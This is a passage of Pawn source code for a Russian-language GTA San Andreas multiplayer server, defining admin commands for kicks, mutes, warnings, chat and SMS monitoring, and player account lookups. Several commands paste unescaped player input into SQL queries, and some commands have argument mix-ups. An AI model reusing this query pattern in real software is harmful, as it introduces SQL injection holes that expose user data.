	if(sscanf(params, "us[64]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /skick [id] [причина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin]) return SendClientMessage(playerid,CGREY,"Вы не можете сделать действие с администраторос выше вас");
	static const fmt_string[] = "[A] %s кикнул игрока %s. Причина: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1]);
	SendAdminMessage(CGREY,str);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	SendClientMessage(params[0],COLOR_LIGHTRED,str);
	SaveAccount(params[0]);
	SetPVarInt(params[0],"Kick1",1);
	Kick(params[0], FIX_FUNCTION, 1200);
	return true;
}
CMD:unavig(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /unavig [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pAvig] == 0) return SendClientMessage(playerid,CGREY,"У администратора нет предупреждений");
	if(PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin]) return SendClientMessage(playerid,CGREY,"Вы не можете сделать действие с администраторос выше вас");
    PlayerInfo[params[0]][pAvig]--;
	static const fmt_string[] = "%s снял Вам предупреждение %s [%d/3]";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],PlayerInfo[params[0]][pAvig]);
	SendClientMessage(params[0], COLOR_LIGHTRED, str);
	static const fmt_string32[] = "[A] %s снял предупреждение администратору %s [%d/3]";
	new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+30];
	format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],PlayerInfo[params[0]][pAvig]);
	SendAdminMessage(CGREY,str32);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str32);
	mysql_tquery(mysql,query);
	return true;
}



CMD:antidm(playerid)
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5|| AdminLogged[playerid] == false ) return true;
	new kek = 0;

	static const fmt_string1[] = "%s | Радиус: %d м.\n";
	new str1[sizeof(fmt_string1)-4+3+40];
	new strg[sizeof(str1)*30];
	strcat(strg,"Создать новую\n");
	for(new i = 0; i < 100; i++)
	{
	    if(!AntiDM[i][admSP]) continue;
	    format(str1, sizeof(str1), fmt_string1,AntiDM[i][admName],AntiDM[i][admRad]);
		strcat(strg,str1);
		ListNick[playerid][kek] = i;
		kek++;
	}
	ShowPlayerDialog(playerid,357,DIALOG_STYLE_LIST,"Anti DM",strg,"Далее","Назад");
	return true;
}

CMD:cbug(playerid)
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 4|| AdminLogged[playerid] == false ) return true;
	ShowPlayerDialog(playerid,354,DIALOG_STYLE_LIST,"Анти +С","Разрешить/запретить игроку\nРазрешить/запретить в радиусе\nРазрешить/запретить всем","Далее","Назад");
	return true;
}
CMD:avig(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "us[64]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /avig [id] [причина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pAvig] == 2) return SendClientMessage(playerid,CGREY,"У администратора уже два предупреждение используйте: /makeadmin");
	if(PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin]) return SendClientMessage(playerid,CGREY,"Вы не можете сделать действие с администраторос выше вас");
    PlayerInfo[params[0]][pAvig]++;
	static const fmt_string[] = "%s выдал Вам предупреждение [%d/3]. Причина: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pAvig],params[1]);
	SendClientMessage(params[0], COLOR_LIGHTRED, str);
	static const fmt_string32[] = "[A] %s выдал предупреждение администратору %s [%d/3]. Причина: %s";
	new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+30];
	format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],PlayerInfo[params[0]][pAvig],params[1]);
	SendAdminMessage(CGREY,str32);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str32);
	mysql_tquery(mysql,query);
	return true;
}


CMD:lwarn(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "us[64]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /lwarn [id] [причина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pLWarn] == 2) return SendClientMessage(playerid,CGREY,"У администратора уже два предупреждение используйте: /makeleader");
	if(!PlayerInfo[params[0]][pLeader]) return SendClientMessage(playerid,CGREY,"Игрок не лидер!");
    PlayerInfo[params[0]][pLWarn]++;
	static const fmt_string[] = "%s выдал Вам предупреждение [%d/3]. Причина: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pLWarn],params[1]);
	SendClientMessage(params[0], COLOR_LIGHTRED, str);
	static const fmt_string32[] = "[A] %s выдал предупреждение лидеру %s [%d/3]. Причина: %s";
	new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+30];
	format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],PlayerInfo[params[0]][pLWarn],params[1]);
	SendAdminMessage(CGREY,str32);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str32);
	mysql_tquery(mysql,query);
	return true;
}
CMD:unlwarn(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /unlwarn [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pLWarn] == 0) return SendClientMessage(playerid,CGREY,"У администратора нет предупреждений");
	if(!PlayerInfo[params[0]][pLeader]) return SendClientMessage(playerid,CGREY,"Игрок не лидер!");
    PlayerInfo[params[0]][pLWarn]--;
	static const fmt_string[] = "%s снял Вам предупреждение %s [%d/3]";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],PlayerInfo[params[0]][pLWarn]);
	SendClientMessage(params[0], COLOR_LIGHTRED, str);
	static const fmt_string32[] = "[A] %s снял предупреждение лидеру %s [%d/3]";
	new str32[sizeof(fmt_string32)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+30];
	format(str32, sizeof(str32), fmt_string32,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],PlayerInfo[params[0]][pLWarn]);
	SendAdminMessage(CGREY,str32);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str32);
	mysql_tquery(mysql,query);
	return true;
}
CMD:vig(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pRank] < 9) return SendClientMessage(playerid,CGREY,"Выговоры могут выдавать только 9 ранги и выше");
	if(sscanf(params, "us[64]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /vig [id] [причина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pFVig] == 2) return SendClientMessage(playerid,CGREY,"У игрока уже два предупреждение используйте: /uninvite");
	if(PlayerInfo[params[0]][pLeader]) return SendClientMessage(playerid,CGREY,"Игрок лидер!");
    PlayerInfo[params[0]][pFVig]++;
	static const fmt_string[] = "%s выдал Вам предупреждение [%d/3]. Причина: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pLWarn],params[1]);
	SendClientMessage(params[0], COLOR_LIGHTRED, str);
	new text[5];
	if(IsAGang(playerid) || IsAMafia(playerid)) text = "[F]";
	else text = "[R]";
	static const fmt_string1[] = "%s %s выдал предупреждение %s [%d/3]. Причина: %s";
	new st2r[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64+5];
	format(st2r, sizeof(st2r), fmt_string1,text,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1]);
	SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,st2r);
	return true;
}
CMD:unvig(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pRank] < 9) return SendClientMessage(playerid,CGREY,"Выговоры могут снимать только 9 ранги и выше");
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /unvig [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pFVig] == 0) return SendClientMessage(playerid,CGREY,"У администратора нет предупреждений");
    PlayerInfo[params[0]][pFVig]--;
	static const fmt_string[] = "%s снял Вам предупреждение %s [%d/3]";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],PlayerInfo[params[0]][pLWarn]);
	SendClientMessage(params[0], COLOR_LIGHTRED, str);
	new text[5];
	if(IsAGang(playerid) || IsAMafia(playerid)) text = "[F]";
	else text = "[R]";
	static const fmt_string1[] = "%s %s снял предупреждение %s [%d/3]";
	new st2r[sizeof(fmt_string1)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64+5];
	format(st2r, sizeof(st2r), fmt_string1,text,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername]);
	SendFMes(PlayerInfo[playerid][pMember],COLOR_SKLAD,st2r);
	return true;
}
CMD:kick(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "us[64]", params[0],params[1])) return SendClientMessage(playerid, CGREY, "Используйте: /kick [id] [причина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin]) return SendClientMessage(playerid,CGREY,"Вы не можете сделать действие с администраторос выше вас");
    if((IsAIP(params[1]) || IsADomen(params[1]))  && PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid,COLOR_LIGHTRED,"В таких сообщениях запрещается использовать английские символы");
		SendClientMessage(playerid,COLOR_LIGHTRED,"Не повторяйте это действие во избежание наказания.");
		return false;
	}
	static const fmt_string[] = "Администратор %s кикнул игрока %s. Причина: %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1]);
	SendAdminToAll(COLOR_LIGHTRED,str);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	SaveAccount(params[0]);
	SetPVarInt(params[0],"Kick1",1);
	Kick(params[0], FIX_FUNCTION, 1200);
	return true;
}
CMD:mute(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 2|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "uis[64]", params[0],params[1],params[2])) return SendClientMessage(playerid, CGREY, "Используйте: /mute [id] [минуты] [причина]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pMuted] > 0) return SendClientMessage(playerid,CGREY,"У данного человека уже есть молчанка");
	if(PlayerInfo[playerid][pAdmin] < PlayerInfo[params[0]][pAdmin]) return SendClientMessage(playerid,CGREY,"Вы не можете сделать действие с администраторос выше вас");
    if((IsAIP(params[2]) || IsADomen(params[2]))  && PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid,COLOR_LIGHTRED,"В таких сообщениях запрещается использовать английские символы");
		SendClientMessage(playerid,COLOR_LIGHTRED,"Не повторяйте это действие во избежание наказания.");
		return false;
	}
	static const fmt_string[] = "Администратор %s выдал молчанку игроку %s [%i мин]. Причина: %s";
	PlayerInfo[params[0]][pMuted] = params[1]*60;
	PlayerInfo[playerid][pMuteKol]++;
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+64];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],params[1],params[2]);
	SendAdminToAll(COLOR_LIGHTRED,str);
	query = "";
	format(query,sizeof(query),"INSERT INTO `admlogs` (`info`) VALUES ('%s')",str);
	mysql_tquery(mysql,query);
	return true;
}
CMD:orgstat(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	new str[150], str2[1500],text[32];
	strcat(str2, "{ffffff}[#] Организация | Лидер | Статус | Онлайн\n\n");
	for(new i = 1; i <= TOTALFRAC; i++)
	{
	    if(GetPlayerID(FracInfo[i][fLeader]) != INVALID_PLAYER_ID) text = "{3caa3c}Online";
	    else text = "{FF3030}Offline";
		format(str,sizeof(str),"{ffffff}[%i] %s | %s | %s{FFFFFF} | %i\n",i,FracInfo[i][fName],FracInfo[i][fLeader],text,GetOnline(i));
		strcat(str2, str);
	}
	new year,mouth,day;
    getdate(year,mouth,day);
	static const fmt_string[] = "Статистика организаций (%i-%i-%i)";
	new str1[sizeof(fmt_string)+9];
	format(str1, sizeof(str1), fmt_string,year,mouth,day);
	ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX, str1, str2, "Ок", "");
	return true;

}
function ShowGetInf(playerid,nick[])
{
    if(cache_get_row_count(mysql)>0)
    {
        new str2[500+400];
        new warn,war3[20],war4[20],warn5,warn8,warn9,warn10,warn11,warn12;
        
        warn = cache_get_field_content_int(0, "job", mysql);
        cache_get_field_content(0, "ipreg", war3, mysql);
        cache_get_field_content(0, "ip", war4, mysql);
        
        warn5 = cache_get_field_content_int(0, "onlmes", mysql);
        warn10 = cache_get_field_content_int(0, "pin1", mysql);
        warn11 = cache_get_field_content_int(0, "ga", mysql);
        warn12 = cache_get_field_content_int(0, "vks", mysql);
        
		new year, month, day, hour, minute, second,year1, month1, day1, hour1, minute1, second1;

		TimestampToDate(cache_get_field_content_int(0, "reg", mysql), year, month, day, hour, minute, second,0);
		TimestampToDate(cache_get_field_content_int(0, "ig", mysql), year1, month1, day1, hour1, minute1, second1,0);
	 	
	 	warn8 = cache_get_field_content_int(0, "koldonate", mysql);
	 	warn9 = cache_get_field_content_int(0, "donate", mysql);
		format(str2, sizeof(str2),"{f7ae11}Основная статистика:\n{FFFFFF}\tОбщее кол-во задоначенных денег: %d\n\tКол-во задоначенных денег на аккаунте: %d\n\tОнлайн за сегодня: %d час(ов)\n\tОнлайн за месяц: %d час(ов)\n\n{f7ae11}Дополнительная статистика:\n{FFFFFF}\tПоследний заход: %02d/%02d/%02d %02d:%02d:%02d\n\tДата регистрации: %02d/%02d/%02d %02d:%02d:%02d\n\tIP Регистрации: %s\n\tIP: %s\n\tPINCODE: %s\n\tGoogle Authenticator: %s\n\tVk Security: %s",warn8,
		warn9,warn,warn5,day,month,year,hour,minute, second,day1,month1,year1,hour1,minute1, second1,war3,war4,(!warn10) ? ("Не установлен"):("Установлен"),(!warn11) ? ("Не установлен"):("Установлен"),(!warn12) ? ("Не установлен"):("Установлен"));
		ShowPlayerDialog(playerid, 0, DIALOG_STYLE_MSGBOX,nick , str2, "Далее", "");
    }
}
/*stock GetInf(playerid,name[])
{
    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", name);
	mysql_tquery(mysql, query, "ShowGetInf", "d", playerid);
	new str2[500+400];
    format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", name);
	mysql_tquery(mysql,query);
	mysql_store_result();
	if(mysql_fetch_row_format(query))
	{
		new warn[5],war1[20],war2[20],war3[20],war4[20],warn5[5],warn8[5],warn9[5],warn10[5],warn11[5],warn12[5];
		mysql_get_field("job", warn);
		mysql_get_field("ig", war2);
		mysql_get_field("reg", war1);
		mysql_get_field("ipreg", war3);
		mysql_get_field("onlmes", warn5);
		mysql_get_field("ip", war4);
		mysql_get_field("pin1", warn10);
		mysql_get_field("ga", warn11);
		mysql_get_field("vks", warn12);
		new reg[6],ig[6];
	 	sscanf(war1, "p<,>a<i>[5]",reg);
	 	sscanf(war2, "p<,>a<i>[5]",ig);
	 	mysql_get_field("koldonate", warn8);
	 	mysql_get_field("donate", warn9);
	 	new ids[5];
	 	mysql_get_field("id", ids);
		new st = strval(ids);
		new srrt[400];
	 	if(PlayerInfo[playerid][pAdmin] > 4)
	 	{
	 	    format(query, sizeof(query), "SELECT * FROM history WHERE nameid = '%d' ORDER BY nameid DESC LIMIT 15", st);
			mysql_tquery(mysql,query);
			mysql_store_result();
			if(mysql_num_rows() > 0)
			{
			    new str1[60];

				format(str1,sizeof(str1),"{FFFFFF}15 последних нарушений %s:\n\n",name);
				strcat(srrt, str1);
				new sos[32];
				new str[100],nameadm[24],reas[50],timr[20];
				for(new i = 0; i < mysql_num_rows();i++)
				{
					mysql_fetch_row(query);

					mysql_get_field("com", sos);
					mysql_get_field("adm", nameadm);
					mysql_get_field("time", timr);
					mysql_get_field("reason", reas);
					format(str,sizeof(str),"\t%s от %s. Причина: %s [%s]\n",sos,nameadm,reas,timr);
					strcat(srrt, str);
				}
				mysql_free_result();
			//	ShowPlayerDialog(playerid,0,DIALOG_STYLE_MSGBOX,"15 последних нарушений",srrt,"Закрыть","");
				SetPVarInt(playerid,"AntiFlood1",gettime() + 3);
			}
	 	}
		format(str2, sizeof(str2),"{f7ae11}Основная статистика:\n{FFFFFF}\tОбщее кол-во задоначенных денег: %s\n\tКол-во задоначенных денег на аккаунте: %s\n\tОнлайн за сегодня: %s час(ов)\n\tОнлайн за месяц: %s час(ов)\n\n{f7ae11}Дополнительная статистика:\n{FFFFFF}\tПоследний заход: %02d/%02d/%02d %02d:%02d:%02d\n\tДата регистрации: %02d/%02d/%02d %02d:%02d:%02d\n\tIP Регистрации: %s\n\tIP: %s\n\tPINCODE: %s\n\tGoogle Authenticator: %s\n\tVk Security: %s\n\n%s",warn8,
		warn9,warn,warn5,ig[0],ig[1],ig[2],ig[3],ig[4],ig[5],reg[0],reg[1],reg[2],reg[3],reg[4],reg[5],war3,war4,(!strval(warn10)) ? ("Не установлен"):("Установлен"),(!strval(warn11)) ? ("Не установлен"):("Установлен"),(!strval(warn12)) ? ("Не установлен"):("Установлен"),(PlayerInfo[playerid][pAdmin] > 4) ? (srrt):(""));
	}
	return str2;
}*/

CMD:get(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "s[32]", params)) return SendClientMessage(playerid, CGREY, "Используйте: /get [ник]");
	/*static const fmt_string1[] = "{f7ae11}Основная статистика:\n{FFFFFF}\tОбщее кол-во задоначенных денег: %s\n\tКол-во задоначенных денег на аккаунте: %s\n\tОнлайн за сегодня: %s час(ов)\n\tОнлайн за месяц: %s час(ов)\n\n{f7ae11}Дополнительная статистика:\n{FFFFFF}\tПоследний заход: %s\n\tДата регистрации: %s\n\tIP Регистрации: %s\n\tIP: %s\n\tPINCODE: %s\n\tGoogle Authenticator: %s\n\tVk Security: %s\n\n%s";
	new str2[sizeof(fmt_string1)+80];*/
//	new str2[377+80];
	query = "";
	format(query, sizeof(query), "SELECT * FROM "TABLE_ACCOUNT" WHERE name = '%s' LIMIT 1", params);
	mysql_tquery(mysql, query, "ShowGetInf", "ds", playerid,params);
 
	return true;
}


CMD:stats(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /stats [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	Stats(playerid,params[0]);
	return true;
}
CMD:aun(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3|| AdminLogged[playerid] == false ) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /aun [id]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(PlayerInfo[params[0]][pMember] == 0) return SendClientMessage(playerid,CGREY,"Игрок не состоит в организации");
	if(PlayerInfo[params[0]][pLeader] > 0) return SendClientMessage(playerid,CGREY,"Вы не можете уволить лидера");
	if(IsPlayerInAnyVehicle(params[0])) return SendClientMessage(playerid,CGREY,"Игрок в транспорте");
	static const fmt_string[] = "[A] %s уволил %s из %s";
	new str[sizeof(fmt_string)+MAX_PLAYER_NAME+MAX_PLAYER_NAME+50];
	format(str, sizeof(str), fmt_string,PlayerInfo[playerid][pSendername],PlayerInfo[params[0]][pSendername],FracInfo[PlayerInfo[params[0]][pMember]][fName]);
	SendAdminMessage(CGREY,str);
	SendClientMessage(params[0],CYELLOW,"Администратор Вас уволил из организации");
	PlayerInfo[params[0]][pMember] = 0;
	for(new i = 0; i <= 4; i++)
	{
	    if(PlayerInfo[params[0]][pObject][i] == 0) continue;
		DestroyDynamicObject(PlayerInfo[params[0]][pObject][i]);
		DestroyDynamic3DTextLabel(PlayerInfo[params[0]][pLable][i]);
	}
	PlayerInfo[params[0]][pRank] = 0;
	PlayerInfo[params[0]][pWork] = 0;
	PlayerInfo[params[0]][pSpawnChange] = 0;
	SetPlayerSkin(params[0],PlayerInfo[params[0]][pModel]);
	SpawnPlayer(params[0]);
	return true;

}
CMD:gtp(playerid, params[])
{
    if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false || GetPVarInt(playerid,"Cops")) return true;
	if(sscanf(params, "i", gtph))
	{
		if(gtp > 0) gtp = 0,SendClientMessageToAll(CREWARD,">> Телепорт к администратору закрыт <<");
	 	else SendClientMessage(playerid, CGREY, "Используйте: /gtp [кол-во]");
	 	return true;
 	}
	if(params[0] < 0 || params[0] > 200) return SendClientMessage(playerid, CGREY, "Кол-во от 0 до 200");
	if(gtp == 0)
	{
		gtp = 1;
		GetPlayerPos(playerid,PlX,PlY,PlZ);
		GetPlayerFacingAngle(playerid,PANGLE);
		avirt = GetPlayerInterior(playerid);
		aint = GetPlayerVirtualWorld(playerid);
 		static const fmt_string1[] = ">> Открыт телепорт к администратору %s <<";
		new str1[sizeof(fmt_string1)+MAX_PLAYER_NAME];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[playerid][pSendername]);
		SendClientMessageToAll(CREWARD,str1);
		SendClientMessageToAll(CREWARD,">> Для телепортации: /gotp <<");
	}
	return true;
}
CMD:chat(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(BigEar[playerid] == 0)
	{
	    BigEar[playerid] = 1;
	    SendClientMessage(playerid,CREWARD,"Вы включили прослушку чата");
	}
	else
	{
	    BigEar[playerid] = 0;
	    SendClientMessage(playerid,CREWARD,"Вы отключили прослушку чата");
	}
	return true;
}
CMD:rsms(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0]))
	{
		if(CheckSMS[playerid] > -1) CheckSMS[playerid] = -1, SendClientMessage(playerid,-1,"Вы отключили прослушку чата организации");
		else SendClientMessage(playerid, CGREY, "Используйте: /rsms [id игрока]");
		return true;
	}
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(CheckSMS[playerid] == -1)
	{
		CheckSMS[playerid] = params[0];
		static const fmt_string1[] = "Вы включили прослушку SMS игрока {f7ae11}%s";
		new str1[sizeof(fmt_string1)+32];
		format(str1, sizeof(str1), fmt_string1,PlayerInfo[params[0]][pSendername]);
		SendClientMessage(playerid,-1,str1);
	}
	else CheckSMS[playerid] = -1, SendClientMessage(playerid,-1,"Вы отключили прослушку SMS");
	return true;
}
CMD:rf(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0]))
	{
		if(CheckF[playerid] > 0) CheckF[playerid] = 0, SendClientMessage(playerid,-1,"Вы отключили прослушку чата организации");
		else SendClientMessage(playerid, CGREY, "Используйте: /rf [id игрока]");
		return true;
	}
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	if(CheckF[playerid] == 0)
	{
		CheckF[playerid] = PlayerInfo[params[0]][pMember];
		static const fmt_string1[] = "Вы включили прослушку чата организации {f7ae11}%s";
		new str1[sizeof(fmt_string1)+32];
		format(str1, sizeof(str1), fmt_string1,FracInfo[PlayerInfo[params[0]][pMember]][fName]);
		SendClientMessage(playerid,-1,str1);
	}
	else CheckF[playerid] = 0, SendClientMessage(playerid,-1,"Вы отключили прослушку чата организации");
	return true;
}
CMD:freeze(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /freeze [id игрока]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	SendClientMessage(playerid,CREWARD,"Вы заморозили игрока");
	TogglePlayerControllable(params[0], 0);
	return true;
}
CMD:unfreeze(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 2 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, CGREY, "Используйте: /unfreeze [id игрока]");
	if(!IsPlayerConnected(params[0]) || PlayerLogged[params[0]] == false) return SendClientMessage(playerid,CGREY,"Такого игрока нет на сервере");
	SendClientMessage(playerid,CREWARD,"Вы разморозили игрока");
	TogglePlayerControllable(params[0], 1);
	return true;
}
CMD:aob(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 5 || AdminLogged[playerid] == false) return true;
	if(sscanf(params, "uiii", params[0],params[1],params[2],params[3])) return SendClientMessage(playerid, CGREY, "Введите: /aob [id] [слот] [кость] [объект]");
	if(params[1] < 4 || params[1] > 6) return SendClientMessage(playerid,CGREY,"Вы можете использовать слоты только от 4 до 6, дабы не мешать работе системы");
	SetPlayerAttachedObject(params[0], params[1], params[3], params[2]);
    SetPVarInt(playerid,"ID",params[3]);
    EditAttachedObject(playerid,params[1]);
	return true;
}
CMD:res(playerid, params[])
{
	if(PlayerLogged[playerid] == false) return true;
	if(PlayerInfo[playerid][pAdmin] < 3 || AdminLogged[playerid] == false) return true;
    if(sscanf(params, "i", params[0]))
    {
	    new
        occupied[(MAX_VEHICLES + 1) char],
        veh,
        i = GetMaxPlayers();
	    do
	    {
	        if((veh = GetPlayerVehicleID(--i)) == 0)
	            continue;
	        occupied{veh} = 1;

